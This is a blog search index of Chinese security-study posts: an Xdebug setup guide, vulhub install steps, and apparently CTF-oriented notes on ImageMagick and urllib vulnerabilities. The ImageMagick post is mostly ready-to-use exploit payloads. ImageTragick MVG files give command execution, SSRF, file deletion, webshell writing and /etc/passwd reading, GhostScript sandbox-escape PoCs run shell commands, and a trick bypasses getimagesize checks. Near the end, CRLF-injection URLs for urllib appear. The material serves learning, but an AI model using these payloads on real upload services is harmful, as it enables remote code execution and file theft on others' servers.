<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>xdebug特定环境配置</title>
    <url>/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>chrome</p>
<p>phpstudy 8.0.9.3</p>
<ul>
<li>此法只适合文件在网站根目录，因此需要自己配置添加网站，将要调试的项目放在此目录</li>
<li>php 7.3.4</li>
</ul>
<p>phpstorm2019</p>
<h2 id="浏览器chrome配置"><a href="#浏览器chrome配置" class="headerlink" title="浏览器chrome配置"></a>浏览器chrome配置</h2><p>下载 Xdebug-helper</p>
<h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><ol>
<li><p>在此版本phpstudy中，只有php7.3.4中有php_xdebug扩展.开启此扩展。</p>
</li>
<li><p>找到对应php.ini文件。</p>
</li>
<li><p><strong>重要：搜索文件找到开启的extension项：<code>extension：php_xdebug</code> 用 <code>;</code>注释掉。因为phpstudy开启这个扩展，但需要的是<code>zend_extension</code></strong></p>
</li>
<li><p>以下内容添加到php.ini尾部</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zend_extension&#x3D;xdebug</span></pre></td></tr><tr><td class="code"><pre><span class="line">[XDebug]</span></pre></td></tr><tr><td class="code"><pre><span class="line">;调试功能模块儿</span></pre></td></tr><tr><td class="code"><pre><span class="line">;extension&#x3D;php_xdebug.dll</span></pre></td></tr><tr><td class="code"><pre><span class="line">;下面是php_xdebug在phpstudy中的位置，根据情况修改，重要！！！！</span></pre></td></tr><tr><td class="code"><pre><span class="line">zend_extension &#x3D; &quot;D:\phpstudy\Extensions\php\php7.3.4nts\ext\php_xdebug.dll&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.remote_handler&#x3D;dbgp</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.idekey&#x3D; &quot;PHPSTORM&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">;开启远程调试</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.remote_enable &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">;远程主机</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.remote_host&#x3D;localhost</span></pre></td></tr><tr><td class="code"><pre><span class="line">;主机端口，重要！！！！</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.remote_port&#x3D;9001</span></pre></td></tr><tr><td class="code"><pre><span class="line">;开启自动跟踪</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.auto_trace &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">;开启异常跟踪</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.show_exception_trace &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">;开启远程调试自动启动</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.remote_autostart &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">;收集变量</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.collect_vars &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">;收集返回值</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.collect_return &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">;收集参数</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.collect_params &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">;临时跟踪信息输出，按需修改</span></pre></td></tr><tr><td class="code"><pre><span class="line">;xdebug.trace_output_dir&#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">;显示局部变量</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.show_local_vars &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.profiler_enable &#x3D; On</span></pre></td></tr><tr><td class="code"><pre><span class="line">;xdebug.profiler_output_dir &#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">xdebug.trace_enable_trigger &#x3D;On</span></pre></td></tr></table></figure>
</li>
<li><p>重启apache服务</p>
</li>
</ol>
<h2 id="phpstorm配置"><a href="#phpstorm配置" class="headerlink" title="phpstorm配置"></a>phpstorm配置</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>每步配置完成后需点击右下角：<code>Apply</code>！！！</p>
<h3 id="php解释器配置"><a href="#php解释器配置" class="headerlink" title="php解释器配置"></a>php解释器配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP</p>
<p>php版本7.3.4。其他的正常配置解释器即可。</p>
<h3 id="debug配置"><a href="#debug配置" class="headerlink" title="debug配置"></a>debug配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug</p>
<p>此步只需更改<code>X-debug port</code>为9001，即第二步在php.ini中配置项为<code>xdebug.remote_port</code>的值</p>
<h3 id="DBGp-Proxy配置"><a href="#DBGp-Proxy配置" class="headerlink" title="DBGp Proxy配置"></a>DBGp Proxy配置</h3><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug-&gt;DBGp Proxy</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IDE key:PHPSTORM</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;第二步在php.ini中配置项为xdebug.idekey的值</span></pre></td></tr><tr><td class="code"><pre><span class="line">HOST:http:&#x2F;&#x2F;test.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;为要调试的项目配置的网站。</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;不要用类似于http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php</span></pre></td></tr><tr><td class="code"><pre><span class="line">Port:80</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;服务器的监听地址</span></pre></td></tr></table></figure>

<p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Server</p>
<ol>
<li>点加号添加，Name随便，下面要用。</li>
<li>Host填调试项目网站。eg:<a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li>
<li>Port:80 </li>
<li>Debugger:Xdebug</li>
</ol>
<h3 id="最终调试前配置"><a href="#最终调试前配置" class="headerlink" title="最终调试前配置"></a>最终调试前配置</h3><p>Run-&gt;Edit Configurations</p>
<ol>
<li>点击<code>+</code></li>
<li>选择Php Web Page</li>
<li>Name随便</li>
<li>Server选择上一步添加Server的Name</li>
<li>Start URL: <a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li>
<li>Browser: Chrome</li>
</ol>
<p>配置完毕</p>
<h3 id="食用"><a href="#食用" class="headerlink" title="食用"></a>食用</h3><p>浏览器的<code>Xdebuger helper</code>选择<code>Debug</code></p>
<p>phpstorm点击右上角电话图标开始监听</p>
<p>phpstorm点击右上角甲壳虫图标开始调试</p>
<p>注意不能浏览器直接访问，要点击甲壳虫图标</p>
<p>如果浏览器访问时，url参数含有<code>XDEBUG_SESSION_START=XXXXX</code>参数，cookie中有 <code>XDEBUG_SESSION =PHPSTORM</code>则成功</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>php</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>vulhub简单安装</title>
    <url>/2019/12/11/vulhub-install/</url>
    <content><![CDATA[<h1 id="vulhub-安装使用"><a href="#vulhub-安装使用" class="headerlink" title="vulhub  安装使用"></a>vulhub  安装使用</h1><h3 id="已备环境"><a href="#已备环境" class="headerlink" title="已备环境"></a>已备环境</h3><ol>
<li>python3</li>
<li>docker</li>
</ol>
<h3 id="安装其他环境"><a href="#安装其他环境" class="headerlink" title="安装其他环境"></a>安装其他环境</h3><ol>
<li><p>启动docker服务</p>
<p><code>service docker start</code></p>
</li>
<li><p>安装docker-compose</p>
<p><code>pip3 install docker-compose</code></p>
</li>
</ol>
<h3 id="下载vulhub并解压"><a href="#下载vulhub并解压" class="headerlink" title="下载vulhub并解压"></a>下载vulhub并解压</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;archive&#x2F;master.zip -O vulhub-master.zip</span></pre></td></tr><tr><td class="code"><pre><span class="line">unzip vulhub-master.zip</span></pre></td></tr><tr><td class="code"><pre><span class="line">cd vulhub-master</span></pre></td></tr></table></figure>

<h3 id="选择并享用"><a href="#选择并享用" class="headerlink" title="选择并享用"></a>选择并享用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ****&#x2F;****</span></pre></td></tr><tr><td class="code"><pre><span class="line">docker-compose build</span></pre></td></tr><tr><td class="code"><pre><span class="line">docker-compose up -d</span></pre></td></tr><tr><td class="code"><pre><span class="line">docker-compose down -v</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>学习</tag>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>ImageMagick</title>
    <url>/2019/12/11/ImageMagick/</url>
    <content><![CDATA[<h1 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h1><ul>
<li><h2 id="Bypass-code"><a href="#Bypass-code" class="headerlink" title="Bypass code"></a>Bypass code</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">$filename &#x3D; $_FILES[&#39;image&#39;][&#39;tmp_name&#39;];</span></pre></td></tr><tr><td class="code"><pre><span class="line">$size &#x3D; getimagesize($filename);</span></pre></td></tr><tr><td class="code"><pre><span class="line">if ($size &amp;&amp; $size[0] &gt; 100 &amp;&amp; $size[1] &gt; 100) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $img &#x3D; new Imagick($_FILES[&#39;image&#39;][&#39;tmp_name&#39;]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $img-&gt;cropThumbnailImage(100, 100);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $img-&gt;writeImage(&#39;newimage.gif&#39;);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>




</li>
</ul>
<ul>
<li><h3 id="ImageMagick漏洞"><a href="#ImageMagick漏洞" class="headerlink" title="ImageMagick漏洞"></a>ImageMagick漏洞</h3><ul>
<li><p>ImageMagick 6.9.3-9 </p>
</li>
<li><h3 id="CVE-2016-3714"><a href="#CVE-2016-3714" class="headerlink" title="CVE-2016-3714"></a>CVE-2016-3714</h3><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p>
<p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的。</p>
<p>调用的漏洞委托：</p>
<p><code>&lt;delegate decode=&quot;https&quot; command=&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;/&gt;</code></p>
<p>漏洞poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|id;&quot;)&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure>
</li>
<li><h3 id="CVE-2016-3718"><a href="#CVE-2016-3718" class="headerlink" title="CVE-2016-3718"></a>CVE-2016-3718</h3><p> 利用mvg格式中可以包含url的特点，进行SSRF攻击 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="code"><pre><span class="line">fill &#39;url(http:&#x2F;&#x2F;example.com&#x2F;)&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure>
</li>
<li><h3 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h3><p> 利用ImageMagick支持的ephemeral协议，来删除任意文件： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;ephemeral:&#x2F;tmp&#x2F;delete.txt&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr></table></figure>
</li>
<li><h3 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h3><p> ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell </p>
<p> 特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_move.mvg</span></pre></td></tr><tr><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;msl:&#x2F;tmp&#x2F;msl.txt&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;msl.txt</span></pre></td></tr><tr><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;image&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;read filename&#x3D;&quot;&#x2F;tmp&#x2F;image.gif&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;write filename&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;shell.php&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;image&gt;</span></pre></td></tr></table></figure>
</li>
<li><h3 id="CVE-2016-3717"><a href="#CVE-2016-3717" class="headerlink" title="CVE-2016-3717"></a>CVE-2016-3717</h3><p> 造成本地文件读取漏洞： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;label:@&#x2F;etc&#x2F;hosts&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure>
</li>
<li><h3 id="Pocs"><a href="#Pocs" class="headerlink" title="Pocs"></a>Pocs</h3><p><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">Pocs</a></p>
</li>
</ul>
</li>
<li><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><ul>
<li><p>漏洞代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">  new Imagick(&#39;vul.gif&#39;);</span></pre></td></tr></table></figure>

<p>无返回值，需从日志读取</p>
</li>
<li><h3 id="ImageMagick内存泄漏漏洞（CVE-2018-16323）"><a href="#ImageMagick内存泄漏漏洞（CVE-2018-16323）" class="headerlink" title="ImageMagick内存泄漏漏洞（CVE-2018-16323）"></a>ImageMagick内存泄漏漏洞（CVE-2018-16323）</h3></li>
<li><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol>
<li><p>生成PoC（ps文件）；</p>
</li>
<li><p>上传即可</p>
</li>
</ol>
</li>
<li><p>poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) currentdevice putdeviceprops</span></pre></td></tr></table></figure>
</li>
<li><h3 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h3></li>
</ul>
</li>
</ul>
<ul>
<li><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol>
<li>生成poc</li>
<li>上传即可</li>
</ol>
</li>
<li><p>poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="code"><pre><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;.actual_pdfpaintproc pdfdict &#x2F;.actual_pdfpaintproc get def</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;exploit &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    (Stage 11: Exploitation...)&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;forceput exch def</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    systemdict &#x2F;SAFER false forceput</span></pre></td></tr><tr><td class="code"><pre><span class="line">    userparams &#x2F;LockFilePermissions false forceput</span></pre></td></tr><tr><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileControl [(*)] forceput</span></pre></td></tr><tr><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileWriting [(*)] forceput</span></pre></td></tr><tr><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileReading [(*)] forceput</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    % update</span></pre></td></tr><tr><td class="code"><pre><span class="line">    save restore</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    % All done.</span></pre></td></tr><tr><td class="code"><pre><span class="line">    stop</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125; def</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">errordict &#x2F;typecheck &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;typecount typecount 1 add def</span></pre></td></tr><tr><td class="code"><pre><span class="line">    (Stage 10: &#x2F;typecheck #)&#x3D;only typecount &#x3D;&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    % The first error will be the .knownget, which we handle and setup the</span></pre></td></tr><tr><td class="code"><pre><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span></pre></td></tr><tr><td class="code"><pre><span class="line">    % dump the operands.</span></pre></td></tr><tr><td class="code"><pre><span class="line">    typecount 1 eq &#123; null &#125; if</span></pre></td></tr><tr><td class="code"><pre><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span></pre></td></tr><tr><td class="code"><pre><span class="line">    typecount 3 eq &#123; (unexpected)&#x3D; quit &#125;  if</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125; put</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span></pre></td></tr><tr><td class="code"><pre><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span></pre></td></tr><tr><td class="code"><pre><span class="line">% marked as executeonly or pseudo-operators.</span></pre></td></tr><tr><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="code"><pre><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span></pre></td></tr><tr><td class="code"><pre><span class="line">% fail because when the routine was declared, it used &#96;bind&#96; but many of the</span></pre></td></tr><tr><td class="code"><pre><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span></pre></td></tr><tr><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="code"><pre><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span></pre></td></tr><tr><td class="code"><pre><span class="line">% works.</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&lt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;typecount      0</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;PDFfile        &#123; (Stage 0: PDFfile)&#x3D; currentfile &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;q              &#123; (Stage 1: q)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;oget           &#123; (Stage 3: oget)&#x3D; pop pop 0 &#125; % clear stack</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;pdfemptycount  &#123; (Stage 4: pdfemptycount)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;gput           &#123; (Stage 5: gput)&#x3D; &#125;  % no-op</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;resolvestream  &#123; (Stage 6: resolvestream)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;pdfopdict      &#123; (Stage 7: pdfopdict)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;.pdfruncontext &#123; (Stage 8: .pdfruncontext)&#x3D; 0 1 mark &#125; % satisfy counttomark and index</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;pdfdict        &#123; (Stage 9: pdfdict)&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        % cause a &#x2F;typecheck error we handle above</span></pre></td></tr><tr><td class="code"><pre><span class="line">        true</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">(Should now have complete control over ghostscript, attempting to read &#x2F;etc&#x2F;passwd...)&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">% Demonstrate reading a file we shouldnt have access to.</span></pre></td></tr><tr><td class="code"><pre><span class="line">(&#x2F;etc&#x2F;passwd) (r) file dup 64 string readline pop &#x3D;&#x3D; closefile</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">(Attempting to execute a shell command...)&#x3D; flush</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">% run command</span></pre></td></tr><tr><td class="code"><pre><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success) (w) file closefile</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">(All done.)&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">quit</span></pre></td></tr></table></figure>

</li>
</ul>
<ul>
<li><h2 id="绕过getimagesize，执行new-ImageMagick-漏洞"><a href="#绕过getimagesize，执行new-ImageMagick-漏洞" class="headerlink" title="绕过getimagesize，执行new ImageMagick()漏洞"></a>绕过getimagesize，执行new ImageMagick()漏洞</h2><ul>
<li><h3 id="mvg格式的POC-："><a href="#mvg格式的POC-：" class="headerlink" title="mvg格式的POC ："></a>mvg格式的POC ：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg&quot;|&quot;&#96;id&#96;)&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr><tr><td class="code"><pre><span class="line">#define xlogo_width 200</span></pre></td></tr><tr><td class="code"><pre><span class="line">#define xlogo_height 200</span></pre></td></tr></table></figure>

<ul>
<li><p>xbm图片是一个文本格式的文件，而不像其他图片一样是二进制文件。如果某一行格式满足</p>
<p><code>#define %s %d</code>，那么取出其中的字符串和数字，再从字符串中取出<code>width</code>或<code>height</code>，将数字作为图片的长和宽。</p>
</li>
<li><p>后面两句，使其正常判断mvg格式文件的大小</p>
</li>
</ul>
</li>
<li><h4 id="ps文件poc"><a href="#ps文件poc" class="headerlink" title="ps文件poc"></a>ps文件poc</h4><ul>
<li><p>借助CVE-2018-16509的POC </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="code"><pre><span class="line">__________________________________________________________________________________________</span></pre></td></tr><tr><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id) currentdevice putdeviceprops</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;test &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">#define xlogo64_width 64</span></pre></td></tr><tr><td class="code"><pre><span class="line">#define xlogo64_height 64</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>漏洞</tag>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>urllib-vul</title>
    <url>/2019/12/11/urllib-vul/</url>
    <content><![CDATA[<h1 id="urllib-CRLF注入"><a href="#urllib-CRLF注入" class="headerlink" title="urllib  CRLF注入"></a>urllib  CRLF注入</h1><ul>
<li>CVE-2016-5699： <code>http://[vps-ip]%0d%0aX-injected:%20header%0d%0atest:5555</code></li>
<li>CVE-2019-9740： <code>http://[vps-ip]%0d%0a%0d%0aheaders:5555</code></li>
<li>CVE-2019-9947： <code>http://[vps-ip]:5555?%0d%0apayload%0d%0apadding</code></li>
<li><code>http://[vps-ip]:5555/%0d%0apayload%0d%0apadding</code></li>
</ul>
<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="code"><pre><span class="line">import urllib</span></pre></td></tr><tr><td class="code"><pre><span class="line">import urllib.error</span></pre></td></tr><tr><td class="code"><pre><span class="line">import urllib.request</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">url &#x3D; sys.argv[1]</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">try:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    info &#x3D; 